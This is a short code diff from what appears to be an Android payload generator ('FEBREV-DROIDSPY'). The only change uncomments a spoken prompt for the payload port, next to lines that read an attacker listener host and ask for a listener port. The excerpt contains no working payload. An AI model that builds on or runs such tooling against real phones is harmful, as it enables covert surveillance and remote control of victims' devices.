@@ -52,7 +52,7 @@ def droid_venom():
 	log0=open("febrev.log","r")
 	lhost=log0.read()
 	log0.close()
-	#os.system("espeak 'please enter the port fpr the payload'")
+	os.system("espeak 'please enter the port fpr the payload'")
 	os.system(f'zenity --title "FEBREV-DROIDSPY" --entry --text "Enter your Listener PORT" --entry-text=6666 > febrev.log')
 	log1=open("febrev.log","r")
 	lport=log1.read()
